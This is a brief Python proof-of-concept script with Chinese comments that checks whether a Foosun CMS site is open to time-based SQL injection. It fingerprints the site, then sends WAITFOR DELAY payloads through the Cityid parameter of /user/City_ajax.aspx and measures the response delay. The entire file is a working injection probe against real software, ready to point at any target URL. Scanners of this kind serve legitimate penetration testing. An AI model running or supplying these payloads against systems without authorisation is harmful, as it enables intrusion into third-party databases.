# coding:utf-8
import requests as req
def verify(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
    }
    resp1 = req.get(target, headers=headers, timeout=30, verify=False, allow_redirects=False)
    if "For Foosun Inc" in resp1.text and resp1.status_code == 200:
        payload1 = "/user/City_ajax.aspx?Cityid=1%27%20WAITFOR%20DELAY%20%270:0:0%27--%20q"#WAITFOR不是SQL的标准语句，所以它只适用于SQL Server数据库。
        payload2 = "/user/City_ajax.aspx?Cityid=1%27%20WAITFOR%20DELAY%20%270:0:5%27--%20q"#payload1立即执行 payload2等待5秒执行
        resp2 = req.get(url=target + payload1, headers=headers, verify=False, timeout=30)
        stime1 = resp2.elapsed.total_seconds()#记录第一次时间
        resp3 = req.get(url=target + payload2, headers=headers, verify=False, timeout=30)
        stime2 = resp3.elapsed.total_seconds()#记录第二次时间
        if resp1.status_code == resp2.status_code == 200 and stime2 - stime1 >= 4.5:
            print (target + "，存在漏洞")
            return True
    return False
if __name__ == '__main__':
    verify("http://lpone/")  